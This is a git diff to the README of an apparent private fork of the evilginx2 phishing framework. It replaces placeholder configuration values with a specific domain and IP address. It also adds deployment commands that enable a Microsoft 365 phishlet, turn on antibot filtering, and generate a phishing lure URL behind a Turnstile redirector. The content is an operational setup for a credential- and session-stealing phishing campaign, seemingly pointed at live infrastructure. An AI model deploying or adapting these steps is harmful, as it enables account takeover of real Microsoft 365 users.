@@ -63,21 +63,23 @@ For comprehensive instructions on installation, detailed configuration, enterpri
 
 3.  **Configure**:
     ```bash
-    domains set yourdomain.com
-    config ipv4 external your.vps.ip
+    domains set asdobeen.com
+    config ipv4 153.75.231.221
     antibot enabled true
     ```
 
 4.  **Deploy**:
     ```bash
-    phishlets hostname o365 login.yourdomain.com
+    phishlets hostname o365 asdobeen.com
     phishlets enable o365
     lures create o365
     lures edit 0 redirector o365_turnstile
     lures get-url 0
     ```
 
-**👉 [Click here for the complete DEPLOYMENT.md guide](DEPLOYMENT.md)**
+**👉 [Complete deployment guide (DEPLOYMENT.md)](DEPLOYMENT.md)** — clone from [github.com/XcloudManiac67/Evilginxmod3](https://github.com/XcloudManiac67/Evilginxmod3)
+
+**🧭 Linux setup summary:** See [setup.md](setup.md) for installer, manual build, Docker, and Cloudflare deployment options.
 
 ---
 
@@ -92,7 +94,10 @@ For comprehensive instructions on installation, detailed configuration, enterpri
 
 ## 🤝 Contributing
 
-This is a private development fork. For the original project:
+This is a private development fork maintained at:
+- **Repository**: https://github.com/XcloudManiac67/Evilginxmod3
+
+Upstream / original project:
 - **Original Repository**: https://github.com/kgretzky/evilginx2
 - **Original Author**: Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky))
 
